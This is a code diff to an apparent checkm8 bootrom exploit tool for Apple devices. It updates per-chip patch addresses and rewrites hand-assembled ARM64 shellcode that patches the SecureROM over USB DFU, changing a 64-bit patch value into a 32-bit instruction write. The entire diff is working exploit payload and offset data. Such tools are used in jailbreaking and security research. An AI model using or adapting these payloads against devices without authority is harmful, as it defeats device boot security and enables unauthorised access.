@@ -648,7 +648,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			cpid = 0x8960;
 			config_large_leak = 7936;
 			config_overwrite_pad = 0x5C0;
-			patch_addr = 0x100005844;
+			patch_addr = 0x100005CE0;
 			memcpy_addr = 0x10000ED50;
 			aes_crypto_cmd = 0x10000B9A8;
 			boot_tramp_end = 0x1800E1000;
@@ -661,7 +661,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			usb_serial_number_string_descriptor = 0x180080562;
 		} else if(strstr(usb_serial_num, " SRTG:[iBoot-1991.0.0.2.16]") != NULL) {
 			cpid = 0x7001;
-			patch_addr = 0x10000AA8C;
+			patch_addr = 0x10000AD04;
 			memcpy_addr = 0x100013F10;
 			aes_crypto_cmd = 0x100010A90;
 			io_buffer_addr = 0x18010D500;
@@ -677,7 +677,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			usb_serial_number_string_descriptor = 0x180080C2A;
 		} else if(strstr(usb_serial_num, " SRTG:[iBoot-1992.0.0.1.19]") != NULL) {
 			cpid = 0x7000;
-			patch_addr = 0x100007C20;
+			patch_addr = 0x100007E98;
 			memcpy_addr = 0x100010E70;
 			aes_crypto_cmd = 0x10000DA90;
 			io_buffer_addr = 0x18010D300;
@@ -693,7 +693,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			usb_serial_number_string_descriptor = 0x18008062A;
 		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2234.0.0.2.22]") != NULL) {
 			cpid = 0x8003;
-			patch_addr = 0x100007D38;
+			patch_addr = 0x10000812C;
 			ttbr0_addr = 0x1800C8000;
 			memcpy_addr = 0x100011030;
 			aes_crypto_cmd = 0x10000DAA0;
@@ -711,7 +711,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			usb_serial_number_string_descriptor = 0x1800807DA;
 		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2234.0.0.3.3]") != NULL) {
 			cpid = 0x8000;
-			patch_addr = 0x100007D38;
+			patch_addr = 0x10000812C;
 			ttbr0_addr = 0x1800C8000;
 			memcpy_addr = 0x100011030;
 			aes_crypto_cmd = 0x10000DAA0;
@@ -734,7 +734,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			tlbi = 0x100000404;
 			nop_gadget = 0x10000CD60;
 			ret_gadget = 0x100000118;
-			patch_addr = 0x100007188;
+			patch_addr = 0x100007668;
 			ttbr0_addr = 0x180050000;
 			func_gadget = 0x10000CD40;
 			write_ttbr0 = 0x1000003B4;
@@ -759,7 +759,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			tlbi = 0x100000434;
 			nop_gadget = 0x10000CC6C;
 			ret_gadget = 0x10000015C;
-			patch_addr = 0x100007044;
+			patch_addr = 0x1000074AC;
 			ttbr0_addr = 0x1800A0000;
 			func_gadget = 0x10000CC4C;
 			write_ttbr0 = 0x1000003E4;
@@ -784,7 +784,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			tlbi = 0x100000444;
 			nop_gadget = 0x10000CD0C;
 			ret_gadget = 0x100000148;
-			patch_addr = 0x100007188;
+			patch_addr = 0x100007630;
 			ttbr0_addr = 0x1800A0000;
 			func_gadget = 0x10000CCEC;
 			write_ttbr0 = 0x1000003F4;
@@ -809,7 +809,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			tlbi = 0x1000004AC;
 			nop_gadget = 0x10000A9C4;
 			ret_gadget = 0x100000148;
-			patch_addr = 0x100005D70;
+			patch_addr = 0x10000624C;
 			ttbr0_addr = 0x18000C000;
 			func_gadget = 0x10000A9AC;
 			write_ttbr0 = 0x10000045C;
@@ -834,7 +834,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			tlbi = 0x100000494;
 			nop_gadget = 0x100008DB8;
 			ret_gadget = 0x10000012C;
-			patch_addr = 0x100004378;
+			patch_addr = 0x100004854;
 			ttbr0_addr = 0x18000C000;
 			func_gadget = 0x100008DA0;
 			write_ttbr0 = 0x100000444;
@@ -1097,9 +1097,9 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 		0xD63F0020, /* blr x1 */
 		0x58000321, /* ldr x1, =usb_serial_number_string_descriptor */
 		0x39000020, /* strb w0, [x1] */
-		0x58000323, /* ldr x3, =patch_addr */
-		0x58000342, /* ldr x2, =patch_val */
-		0xF9000062, /* str x2, [x3] */
+		0x52BA5002, /* mov w2, #0xD2800000 */
+		0x58000303, /* ldr x3, =patch_addr */
+		0xB9000062, /* str w2, [x3] */
 		0xA8C17BFD, /* ldp x29, x30, [sp], #0x10 */
 		0xD65F03C0 /* ret */
 	}, payload_A9[] = {
@@ -1136,9 +1136,9 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 		0xD50E871F, /* tlbi alle3 */
 		0xD5033F9F, /* dsb sy */
 		0xD5033FDF, /* isb */
-		0x58000423, /* ldr x3, =patch_addr */
-		0x58000442, /* ldr x2, =patch_val */
-		0xF9000062, /* str x2, [x3] */
+		0x52BA5002, /* mov w2, #0xD2800000 */
+		0x58000403, /* ldr x3, =patch_addr */
+		0xB9000062, /* str w2, [x3] */
 		0xB2790021, /* orr x1, x1, #ARM_TTE_BLOCK_AP(AP_RONA) */
 		0xF9000001, /* str x1, [x0] */
 		0xD5033F9F, /* dsb sy */
@@ -1191,11 +1191,11 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 	};
 	struct {
 		uint8_t payload[sizeof(payload_notA9)];
-		uint64_t pwnd[2], payload_dest, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor, patch_addr, patch_val;
+		uint64_t pwnd[2], payload_dest, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor, patch_addr;
 	} notA9;
 	struct {
 		uint8_t payload[sizeof(payload_A9)];
-		uint64_t pwnd[2], payload_dest, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor, ttbr0_vrom_addr, patch_addr, patch_val;
+		uint64_t pwnd[2], payload_dest, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor, ttbr0_vrom_addr, patch_addr;
 	} A9;
 	struct {
 		uint8_t payload[sizeof(payload_handle_checkm8_request)];
@@ -1248,7 +1248,6 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 		A9.usb_serial_number_string_descriptor = usb_serial_number_string_descriptor;
 		A9.ttbr0_vrom_addr = ttbr0_addr + ttbr0_vrom_off;
 		A9.patch_addr = patch_addr;
-		A9.patch_val = 0xD65F03C052800000ULL;
 		memcpy(payload + payload_sz, &A9, sizeof(A9));
 		payload_sz += sizeof(A9);
 	} else {
@@ -1264,7 +1263,6 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 		notA9.usb_create_string_descriptor = usb_create_string_descriptor;
 		notA9.usb_serial_number_string_descriptor = usb_serial_number_string_descriptor;
 		notA9.patch_addr = patch_addr;
-		notA9.patch_val = 0xD65F03C052800000ULL;
 		if(cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8012 || cpid == 0x8015) {
 			notA9.patch_addr += ARM_16K_TT_L2_SZ;
 		}
